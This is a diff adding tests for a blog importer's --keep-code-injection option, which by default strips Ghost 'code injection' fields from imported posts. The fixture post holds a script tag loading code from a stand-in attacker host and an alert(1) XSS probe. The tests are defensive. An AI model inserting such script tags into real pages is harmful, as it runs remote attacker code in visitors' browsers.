@@ -320,6 +320,83 @@ describe('cli import-ghost — --max-size (#558)', () => {
   });
 });
 
+describe('cli import-ghost — --keep-code-injection (#561)', () => {
+  let dir: string;
+  let exportFile: string;
+
+  beforeEach(async () => {
+    dir = await realpath(await mkdtemp(join(tmpdir(), 'nectar-import-cli-ci-')));
+    exportFile = join(dir, 'export.json');
+    await writeFile(
+      exportFile,
+      JSON.stringify({
+        db: [
+          {
+            data: {
+              posts: [
+                {
+                  id: 'p1',
+                  title: 'Pwn',
+                  slug: 'pwn',
+                  html: '<p>body</p>',
+                  status: 'published',
+                  type: 'post',
+                  codeinjection_head: '<script src="https://attacker.example/x.js"></script>',
+                  codeinjection_foot: '<script>alert(1)</script>',
+                },
+              ],
+            },
+          },
+        ],
+      }),
+    );
+  });
+
+  afterEach(async () => {
+    await rm(dir, { recursive: true, force: true });
+  });
+
+  test('help advertises --keep-code-injection', async () => {
+    const { stdout, exitCode } = await runCli(['import-ghost', '--help'], dir);
+    expect(exitCode).toBe(0);
+    expect(stdout).toContain('--keep-code-injection');
+  });
+
+  test('default drops codeinjection fields and prints an audit summary', async () => {
+    const { stderr, exitCode } = await runCli(
+      ['import-ghost', exportFile, '--on-conflict', 'overwrite'],
+      dir,
+    );
+    expect(exitCode).toBe(0);
+    expect(stderr).toContain(
+      'Skipped code injection in 1 posts. Re-run with --keep-code-injection to import them.',
+    );
+    const md = await readFile(join(dir, 'content/posts/pwn.md'), 'utf8');
+    expect(md).not.toContain('codeinjection_head');
+    expect(md).not.toContain('codeinjection_foot');
+    expect(md).not.toContain('attacker.example');
+  });
+
+  test('--keep-code-injection preserves the fields and suppresses the audit summary', async () => {
+    const { stderr, exitCode } = await runCli(
+      ['import-ghost', exportFile, '--on-conflict', 'overwrite', '--keep-code-injection'],
+      dir,
+    );
+    expect(exitCode).toBe(0);
+    expect(stderr).not.toContain('Skipped code injection');
+    const md = await readFile(join(dir, 'content/posts/pwn.md'), 'utf8');
+    expect(md).toContain('codeinjection_head');
+    expect(md).toContain('attacker.example');
+  });
+
+  test('--dry-run lists the Code injection skipped row', async () => {
+    const { stdout, exitCode } = await runCli(['import-ghost', exportFile, '--dry-run'], dir);
+    expect(exitCode).toBe(0);
+    expect(stdout).toContain('Code injection skipped');
+    expect(stdout).toContain('--keep-code-injection');
+  });
+});
+
 describe('parseSizeSpec (#558)', () => {
   test('parses raw bytes', () => {
     expect(parseSizeSpec('1024')).toBe(1024);
